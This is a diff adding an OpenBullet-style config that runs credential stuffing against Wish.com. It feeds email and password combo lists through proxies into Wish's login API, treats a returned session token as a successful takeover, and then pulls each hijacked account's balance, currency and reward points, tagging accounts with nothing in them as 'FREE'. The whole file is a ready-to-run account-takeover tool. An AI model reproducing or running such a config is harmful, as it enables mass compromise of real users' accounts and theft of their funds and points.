@@ -1,0 +1,101 @@
+[SETTINGS]
+{
+  "Name": "Wish.com [API]",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-17T16:02:41.2688732+03:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#POST REQUEST POST "https://www.wish.com/api/email-login" 
+  CONTENT "_app_type=wish&_capabilities%5B%5D=2&_capabilities%5B%5D=4&_capabilities%5B%5D=3&_capabilities%5B%5D=6&_capabilities%5B%5D=7&_capabilities%5B%5D=9&_capabilities%5B%5D=11&_capabilities%5B%5D=12&_capabilities%5B%5D=13&_capabilities%5B%5D=15&_capabilities%5B%5D=21&_capabilities%5B%5D=24&_capabilities%5B%5D=25&_capabilities%5B%5D=28&_capabilities%5B%5D=32&_capabilities%5B%5D=33&_capabilities%5B%5D=35&_capabilities%5B%5D=39&_capabilities%5B%5D=40&_capabilities%5B%5D=43&_capabilities%5B%5D=46&_capabilities%5B%5D=47&_capabilities%5B%5D=49&_capabilities%5B%5D=51&_capabilities%5B%5D=52&_capabilities%5B%5D=55&_capabilities%5B%5D=61&_capabilities%5B%5D=64&_capabilities%5B%5D=65&_capabilities%5B%5D=70&_capabilities%5B%5D=72&_capabilities%5B%5D=76&_capabilities%5B%5D=77&_capabilities%5B%5D=53&_capabilities%5B%5D=55&_capabilities%5B%5D=84&_capabilities%5B%5D=88&_capabilities%5B%5D=89&_capabilities%5B%5D=78&_capabilities%5B%5D=92&_capabilities%5B%5D=93&_capabilities%5B%5D=94&_capabilities%5B%5D=95&_capabilities%5B%5D=97&_capabilities%5B%5D=98&_capabilities%5B%5D=99&_capabilities%5B%5D=105&_capabilities%5B%5D=106&_capabilities%5B%5D=110&_capabilities%5B%5D=120&_capabilities%5B%5D=127&_capabilities%5B%5D=123&_capabilities%5B%5D=125&_capabilities%5B%5D=130&_capabilities%5B%5D=131&_capabilities%5B%5D=135&_capabilities%5B%5D=145&_capabilities%5B%5D=117&_capabilities%5B%5D=147&_capabilities%5B%5D=158&_capabilities%5B%5D=156&_capabilities%5B%5D=161&_capabilities%5B%5D=164&_capabilities%5B%5D=167&_capabilities%5B%5D=124&_cashshield_session_id=3EBD45C2-6163-40E6-9439-DAAAAC68D9CB&_client=iosapp&_riskified_session_token=B9AF7473-866A-4498-B68B-EF753AC7B7AA&_threat_metrix_session_token=7625-D5C2C287-36DD-4575-93EA-A0E923EBFA74&_version=4.18.7&_xsrf=1&app_device_id=4b45a41263a3f84067940981aafdfe58b34d0132&app_device_model=iPhone9%2C3&email=<USER>&from_ad=false&icloud_autologin=false&password=<PASS>&session_refresh=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "_xsrf: 1" 
+  HEADER "origin: https://www.wish.com" 
+  HEADER "referer: https://www.wish.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fa,en-US;q=0.9,en;q=0.8" 
+  HEADER "content-length: 1280" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"session_token\":" 
+  KEYCHAIN Failure OR 
+    KEY "Email or Password is incorrect" 
+
+#CAP REQUEST POST "https://www.wish.com/api/user/status" 
+  CONTENT "_app_type=wish&_capabilities%5B%5D=2&_capabilities%5B%5D=4&_capabilities%5B%5D=3&_capabilities%5B%5D=6&_capabilities%5B%5D=7&_capabilities%5B%5D=9&_capabilities%5B%5D=11&_capabilities%5B%5D=12&_capabilities%5B%5D=13&_capabilities%5B%5D=15&_capabilities%5B%5D=21&_capabilities%5B%5D=24&_capabilities%5B%5D=25&_capabilities%5B%5D=28&_capabilities%5B%5D=32&_capabilities%5B%5D=33&_capabilities%5B%5D=35&_capabilities%5B%5D=39&_capabilities%5B%5D=40&_capabilities%5B%5D=43&_capabilities%5B%5D=46&_capabilities%5B%5D=47&_capabilities%5B%5D=49&_capabilities%5B%5D=51&_capabilities%5B%5D=52&_capabilities%5B%5D=55&_capabilities%5B%5D=61&_capabilities%5B%5D=64&_capabilities%5B%5D=65&_capabilities%5B%5D=70&_capabilities%5B%5D=72&_capabilities%5B%5D=76&_capabilities%5B%5D=77&_capabilities%5B%5D=53&_capabilities%5B%5D=55&_capabilities%5B%5D=84&_capabilities%5B%5D=88&_capabilities%5B%5D=89&_capabilities%5B%5D=78&_capabilities%5B%5D=92&_capabilities%5B%5D=93&_capabilities%5B%5D=94&_capabilities%5B%5D=95&_capabilities%5B%5D=97&_capabilities%5B%5D=98&_capabilities%5B%5D=99&_capabilities%5B%5D=105&_capabilities%5B%5D=106&_capabilities%5B%5D=110&_capabilities%5B%5D=120&_capabilities%5B%5D=127&_capabilities%5B%5D=123&_capabilities%5B%5D=125&_capabilities%5B%5D=130&_capabilities%5B%5D=131&_capabilities%5B%5D=135&_capabilities%5B%5D=145&_capabilities%5B%5D=117&_capabilities%5B%5D=147&_capabilities%5B%5D=158&_capabilities%5B%5D=156&_capabilities%5B%5D=161&_capabilities%5B%5D=164&_capabilities%5B%5D=167&_capabilities%5B%5D=124&_cashshield_session_id=3EBD45C2-6163-40E6-9439-DAAAAC68D9CB&_client=iosapp&_riskified_session_token=B9AF7473-866A-4498-B68B-EF753AC7B7AA&_threat_metrix_session_token=7625-D5C2C287-36DD-4575-93EA-A0E923EBFA74&_version=4.18.7&_xsrf=1&app_device_id=4b45a41263a3f84067940981aafdfe58b34d0132&app_device_model=iPhone9%2C3&supports_mobile_action_dict=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.wish.com" 
+  HEADER "referer: https://www.wish.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fa,en-US;q=0.9,en;q=0.8" 
+  HEADER "content-length: 1280" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+
+#CURRENCY PARSE "<SOURCE>" LR "\"currency_code\": \"" "\"}," CreateEmpty=FALSE -> CAP "CURRENCY" 
+
+#Balance PARSE "<SOURCE>" JSON "localized_value" CreateEmpty=FALSE -> CAP "Balance" "" " <CURRENCY>" 
+
+#Points PARSE "<SOURCE>" LR "\"user_reward_points\": " "," CreateEmpty=FALSE -> CAP "Points" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" EqualTo "100" 
+    KEY "<SOURCE>" EqualTo "0 <CURRENCY>" 
+  
+
